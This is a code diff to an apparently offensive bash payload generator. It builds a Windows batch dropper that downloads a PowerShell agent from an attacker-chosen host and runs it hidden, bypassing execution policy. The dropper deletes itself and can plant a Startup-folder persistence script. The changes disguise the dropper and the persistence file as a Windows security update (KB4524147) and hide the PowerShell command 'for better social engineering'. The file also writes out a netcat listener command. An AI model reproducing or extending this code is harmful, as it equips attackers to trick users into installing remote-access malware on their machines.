@@ -12303,6 +12303,7 @@ sh_menu
 # ----------------------------------------------
 sh_evasion3 () {
 Colors;
+
 ## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
 echo "---"
 echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
@@ -12314,24 +12315,24 @@ echo "---"
 sleep 2
 
 
-## Get (store) User Inputs (bash variable declarations)..
+## Store User Inputs (bash variable declarations)..
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-ID00788\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
-NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
-rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %userprofile%\\\\\\\Desktop" --entry --width 350) > /dev/null 2>&1
+NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-Update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
+rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %localappdata%\nexample: %userprofile%\\\\\\\Desktop" --entry --width 350) > /dev/null 2>&1
 
 
 ## Setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
 if [ -z "$Drop" ]; then Drop="Update-ID00788";fi
-if [ -z "$rpath" ]; then rpath="%tmp%";fi
-if [ -z "$NaM" ]; then NaM="Security-update";fi
+if [ -z "$rpath" ]; then rpath="%localappdata%";fi
+if [ -z "$NaM" ]; then NaM="Security-Update";fi
 
 
-## Generate Random {8 chars} Persistence script name (letters only).
-random_name=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 8 | head -n 1)
+## Generate Random {4 chars} Persistence script name. { KB4524147_4Fn7.update }
+random_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-7' | fold -w 4 | head -n 1)
 ## Random chose one fake extension.
 # to Masquerade the dropper real extension (MITRE T1036)
 index=$(cat /dev/urandom | tr -dc '1-5' | fold -w 1 | head -n 1)
@@ -12364,25 +12365,28 @@ echo "---"
 ## BUILD DROPPER (to download/execute our agent.ps1).
 # echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1 # <-- OLD DELIVERY METHOD (dropper)
 echo "${BlueF}[☠]${white} Building Obfuscated batch dropper ..${white}";sleep 2
-persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\nHow It Works: '$Drop.$ext.bat' IF executed will change target PS execution\nPolicy to allow the auto-execution of PS scripts downloaded from network, then\nit will download/exec our '$NaM.ps1' (to the UPLOAD Location chosen\nby attacker) and writes '$random_name.bat' into target Startup folder.\n$random_name.bat will execute\nour '$NaM.ps1' on every reboot." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
+persistence=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Do you wish to add persistence to dropper.bat ?\n\nHow It Works: '$Drop.$ext.bat' IF executed will change target PS execution\nPolicy to allow the auto-execution of PS scripts downloaded from network, then\nit will download/exec our '$NaM.ps1' (to the UPLOAD Location chosen\nby attacker) and writes 'KB4524147_$random_name.update.bat' into target Startup folder.\nKB4524147_$random_name.update.bat will execute our '$NaM.ps1' on every reboot." --radiolist --column "Pick" --column "Option" TRUE "Dont Add Persistence" FALSE "Add persistence") > /dev/null 2>&1
 
 if [ "$persistence" = "Dont Add Persistence" ]; then
    echo "@echo off" > $IPATH/output/$Drop.$ext.bat
+   echo "title Cumulative Security Update ID00788" >> $IPATH/output/$Drop.$ext.bat
    echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
    echo "Timeout /T 2 >nul && Del /F /Q $Drop.$ext.bat" >> $IPATH/output/$Drop.$ext.bat # <-- delete script at the end of execution.
 else
    ## Special thanks to: [ @codings9 ] for all the help provided in debug this function on windows10..
-   echo "${BlueF}[${YellowF}i${BlueF}]${white} Persistence activated on: $Drop.$ext.bat ..${white}";sleep 2
-   echo "${BlueF}[${YellowF}i${BlueF}]${white} Random Persistence Script Name: U$random_name.bat ..${white}";sleep 2
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Persistence active on: $Drop.$ext.bat ..${white}";sleep 2
    echo "@echo off" > $IPATH/output/$Drop.$ext.bat
    echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.$ext.bat
    ## Setting target PS Execution Policy to 'RemoteSigned' to be abble to exec our agent.ps1 on Startup.
    echo "cmd /R echo Y | powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
-   echo "echo PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\U$random_name.bat\"" >> $IPATH/output/$Drop.$ext.bat
+   ## Persistence script updated to hidde the 'powershell execution command' (better social engineering).
+   echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+   echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+   echo "echo PoWeRsHeLl.exe -Execution Bypass -WindowStyle Hidden -NoProfile -File \"$rpath\\$NaM.ps1\" >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
    echo "Timeout /T 2 >nul && Del /F /Q $Drop.$ext.bat" >> $IPATH/output/$Drop.$ext.bat # <-- delete script at the end of execution.
 fi
 
@@ -12473,14 +12477,13 @@ rm $ApAcHe/Download.html > /dev/nul 2>&1
 if [ "$persistence" = "Add persistence)" ]; then
    ## Write how to delete persistence to output folder ..
    echo "LHOST: $lhost" > $IPATH/output/delete_persistence.txt
-   echo "LPORT: $lport" >> $IPATH/output/delete_persistence.txt
    echo "HANDLER: sudo nc -lvp $lport" >> $IPATH/output/delete_persistence.txt
    echo "TO DELETE PERSISTENCE FROM TARGET MACHINE" >> $IPATH/output/delete_persistence.txt
    echo "EXECUTE THE FOLLOW COMMANDS ON TARGET CMD" >> $IPATH/output/delete_persistence.txt
    echo "-----------------------------------------" >> $IPATH/output/delete_persistence.txt
    echo "cmd /C echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/delete_persistence.txt
    echo "del /F /Q \"$rpath\\$NaM.ps1\"" >> $IPATH/output/delete_persistence.txt
-   echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\U$random_name.bat\"" >> $IPATH/output/delete_persistence.txt
+   echo "del /F /Q \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/delete_persistence.txt
    zenity --title="☠ Reverse TCP Powershell Shell (hex obfuscation) ☠" --text "REMARK: Instructions how to manualy delete persistence from target stored in:\n$IPATH/output/delete_persistence.txt" --info > /dev/null 2>&1
 fi
 sh_menu
